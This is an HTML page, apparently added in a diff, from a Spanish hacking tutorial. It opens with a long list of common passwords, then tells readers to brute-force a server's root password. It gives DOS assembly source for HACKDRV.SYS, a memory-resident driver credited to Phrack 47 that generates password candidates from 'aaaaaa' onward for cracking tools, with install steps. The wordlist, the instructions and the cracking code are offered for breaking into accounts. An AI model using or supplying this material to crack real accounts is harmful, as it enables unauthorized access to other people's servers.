+andrea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+animal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; answer <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; anything&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+arrow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+arthur&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ass <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; asshole&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+athena&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+atmosphere&nbsp;&nbsp;&nbsp;&nbsp; bacchus <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; badass&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+bailey&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+banana&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bandit <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; banks&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+bass&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+batman&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; beautiful <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; beauty&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+beaver&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+daniel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; danny <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+dave&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+deb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+debbie&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; deborah <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; december&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+desire&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+desperate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; develop <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+diet&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+digital&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+discovery&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; disney <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+dog&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+drought&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+duncan&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; easy <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eatme&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+edges&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+edwin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; egghead <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eileen&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+einstein&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+elephant&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; elizabeth <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ellen&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+emerald&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+engine&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; engineer <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; enterprise&nbsp;&nbsp;&nbsp;&nbsp;
+enzyme&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+euclid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; evelyn <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; extension&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+fairway&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+felicia&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fender <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; finite&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+format&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+god&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; hello <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; idiot&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+jester&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+john&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; johnny <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; joseph&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+joshua&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+judith&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; juggle <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; julia&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+kathleen&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+kermit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kernel <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; knight&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+lambda&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+larry&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lazarus <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+lee&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+leroy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+lewis&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; light <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+lisa&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+louis&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+love&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lynne <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+mac&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+macintosh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+mack&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; maggot <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; martin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+marty&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+marvin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; matt <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; master&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+maurice&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+maximum&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; merlin <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+mets&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+michael&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+michelle&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mike <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; minimum&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+nicki&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+nicole&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rascal <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; really&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+rebecca&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+remote&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rick <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reagan&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+robot&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+robotics&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rolex <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ronald&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+rose&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+rosebud&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rosemary <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; roses&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ruben&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+rules&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ruth <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+saxon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+scheme&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; scott <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; secret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sensor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+serenity&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sex <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; shark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sharon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+shit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; shiva <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; shuttle&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+simon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+simple&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; singer <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; single&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+singing&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+smile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; smooch <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; smother&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+snatch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+snoopy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; soap <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; socrates&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+spit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+spring&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; subway <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; success&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+summer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+super&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; support <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; surfer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+suzanne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+tangerine&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tape <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; target&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+taylor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+telephone&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; temptation <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tiger&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+tigger&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+toggle&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tomato <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toyota&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+trivial&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+unhappy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; unicorn <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; unknown&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+urchin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+utility&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vicki <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virginia&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+warren&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+water&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; weenie <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; whatnot&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+whitney&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+will&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; virgin <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; william&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+winston&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+willie&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; wizard <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; wonbat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+yosemite&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+zap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; whatnow <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">Obtuve algunas cuentas, ahora? </font></p>
+
+<p><font face="Courier" size="3">Para&nbsp; poder&nbsp; hacer&nbsp; y&nbsp; deshacer en el
+servidor necesitas el password&nbsp; de&nbsp; la cuenta root. Si despues de intentar con
+algunas listas de palabras no puedes necesitaras&nbsp; hacer&nbsp; un ataque en bruto, es
+decir empezar desde&nbsp; la&nbsp; letra&nbsp; A hasta la palabra zzzzzzzz </font></p>
+
+<p><font face="Courier" size="3">El&nbsp; siguiente programa necesita ser compilado usando
+TASM y es una lista&nbsp; de palabras TSR que no ocupa espacio en disco y puede ser
+modificada,&nbsp; es ideal para ataques brutos a la cuenta r00t&#19; (Programa Copiado de
+Phrack 47) <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">P A S S W O R D&nbsp;&nbsp; E N G I N E&nbsp; (for IBM
+PC's)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+by Uncle Armpit <br>
++++++++++++++++++++++++++++++++++++++++++++++ </font></p>
+
+<p><font face="Courier" size="3">Que tan practico es? </font></p>
+
+<p><font face="Courier" size="3">Este programa no necesita mucho espacio en disco y puede
+crear listas de palabras de gran tama¤o. </font></p>
+
+<p><font face="Courier" size="3">Con el ejemplo proporcionado, passwords empezando en
+'aaaaaaa' y terminando en 'zzzzzzz' seran generados. <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">Como empiezo a usar esta lista de palabras? </font></p>
+
+<p><font face="Courier" size="3">Compila el codigo y nombralo &quot;hackdrv.sys&quot;,
+despues necesitas configurarlo añadiendo la siguiente linea en CONFIG.SYS </font></p>
+
+<p><font face="Courier" size="3">device=c:\hackdrv.sys </font></p>
+
+<p><font face="Courier" size="3">Una vez en memoria el programa creara la lista de
+variables en memoria llamada HACKPWD. Cualquier programa que uses (excepto StarCracker)
+debera reconocer hackpwd como una lista de palabras y empezar a crackear. </font></p>
+
+<p><font face="Courier" size="3">Si deseas reiniciar una sesion desde una combinacion
+especifica solo modifica el archivo HACKDRV.SYS con un editor HEXADECIMAL y modifica la
+cadena de caracteres con los que empieza ;-0 </font></p>
+
+<p><font face="Courier" size="3">;-----------------------cut
+here-------------------------------- <br>
+;Program HACKDRV.SYS <br>
+; <br>
+org 0h <br>
+next_dev dd -1 <br>
+attribute dw 0c000h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+;character device w/ ioctl calls <br>
+strategy dw dev_strategy <br>
+interrupt dw dev_int <br>
+dev_name db 'HACKPWD ' <br>
+countr dw offset number <br>
+number db 'aaaaaa',0ah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&lt;---- 6
+caracteres en minusculas (empiezo) <br>
+numsize equ $-number - 2 <br>
+afternum: </font></p>
+
+<p><font face="Courier" size="3">;working space for device driver <br>
+rh_ofs dw ? <br>
+rh_seg dw ? </font></p>
+
+<p><font face="Courier" size="3">dev_strategy:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+;strategy routine <br>
+mov cs:rh_seg,es <br>
+mov cs:rh_ofs,bx <br>
+retf </font></p>
+
+<p><font face="Courier" size="3">dev_int:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+;interrupt routine <br>
+pushf <br>
+push ds <br>
+push es <br>
+push ax <br>
+push bx <br>
+push cx <br>
+push dx <br>
+push di <br>
+push si </font></p>
+
+<p><font face="Courier" size="3">cld <br>
+push cs <br>
+pop ds </font></p>
+
+<p><font face="Courier" size="3">mov bx,cs:rh_seg <br>
+mov es,bx <br>
+mov bx,cs:rh_ofs </font></p>
+
+<p><font face="Courier" size="3">mov al,es:[bx]+2 <br>
+rol al,1 <br>
+mov di,offset cmdtab <br>
+xor ah,ah <br>
+add di,ax <br>
+jmp word ptr[di] <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">cmdtab:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+;command table <br>
+dw init&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;0 <br>
+dw exit3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;1 <br>
+dw exit3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;2 <br>
+dw ioctl_read&nbsp; ;3 <br>
+dw do_read&nbsp;&nbsp;&nbsp;&nbsp; ;4 <br>
+dw exit3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;5 <br>
+dw exit3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;6 <br>
+dw exit3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;7 <br>
+dw exit3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;8 <br>
+dw exit3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;9 <br>
+dw exit3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;10 <br>
+dw exit3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;11 <br>
+dw ioctl_write ;12 <br>
+dw exit3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;13 <br>
+dw 5 dup (offset exit3) <br>
+&nbsp; <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">ioctl_read: <br>
+push es <br>
+push bx </font></p>
+
+<p><font face="Courier" size="3">mov si,es:[bx+10h] <br>
+mov di,es:[bx+0eh] <br>
+mov es,si </font></p>
+
+<p><font face="Courier" size="3">push cs <br>
+pop ds <br>
+mov si,offset number <br>
+xor cx,cx </font></p>
+
+<p><font face="Courier" size="3">get_char: <br>
+lodsb <br>
+stosb <br>
+inc cl <br>
+cmp al,0ah <br>
+jz ioctl_rend <br>
+jmp get_char </font></p>
+
+<p><font face="Courier" size="3">ioctl_rend: <br>
+pop bx <br>
+pop es <br>
+mov es:[bx+012h],cx <br>
+mov cs:countr,offset number <br>
+jmp exit2 </font></p>
+
+<p><font face="Courier" size="3">ioctl_write: <br>
+push es <br>
+push bx <br>
+mov si,es:[bx+010h] <br>
+mov ds,si <br>
+mov si,es:[bx+0eh] <br>
+mov
+cx,numsize+1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+;es:[bx+012h] <br>
+push cs <br>
+pop es <br>
+mov di,offset number <br>
+repe movsb <br>
+pop es <br>
+pop bx <br>
+mov cs:countr,offset number <br>
+jmp exit2 <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">do_read: <br>
+push es <br>
+push bx <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">push cs <br>
+pop ds </font></p>
+
+<p><font face="Courier" size="3">mov si,[countr] <br>
+inc
+si&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+;word ptr [countr] <br>
+cmp si,offset afternum <br>
+jnz is_okay <br>
+mov si,offset number <br>
+call inc_num <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">is_okay: <br>
+mov [countr],si <br>
+mov di,es:[bx]+0eh <br>
+mov ax,es:[bx]+010h <br>
+mov cx, es:[bx]+012h <br>
+jcxz clean_up <br>
+mov es,ax <br>
+repe movsb </font></p>
+
+<p><font face="Courier" size="3">clean_up: <br>
+pop bx <br>
+pop es <br>
+jmp exit2 <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">exit3: mov es:word ptr 3[bx],08103h <br>
+jmp exit1 </font></p>
+
+<p><font face="Courier" size="3">exit2: <br>
+mov es:word ptr 3[bx],0100h </font></p>
+
+<p><font face="Courier" size="3">exit1: <br>
+pop si <br>
+pop di <br>
+pop dx <br>
+pop cx <br>
+pop bx <br>
+pop ax <br>
+pop es <br>
+pop ds <br>
+popf <br>
+retf <br>
+exit: </font></p>
+
+<p><font face="Courier" size="3">inc_num proc near <br>
+&nbsp;push si <br>
+&nbsp;mov si,numsize </font></p>
+
+<p><font face="Courier" size="3">&nbsp;reiterate: <br>
+&nbsp; inc byte ptr [number+si] <br>
+&nbsp; cmp byte ptr [number+si],'z'+1&nbsp;&nbsp;&nbsp; ;+1 past ending char. in range <br>
+&nbsp; jnz _exit <br>
+&nbsp; mov byte ptr [number+si],'a'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;starting char. in range
+<br>
+&nbsp; dec si <br>
+&nbsp; cmp si,-1 <br>
+&nbsp; jnz reiterate <br>
+&nbsp; mov byte ptr [number],01ah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;send EOF <br>
+&nbsp;_exit: <br>
+&nbsp; pop si <br>
+&nbsp; ret <br>
+inc_num endp <br>
+&nbsp; <br>
+&nbsp; </font></p>
+
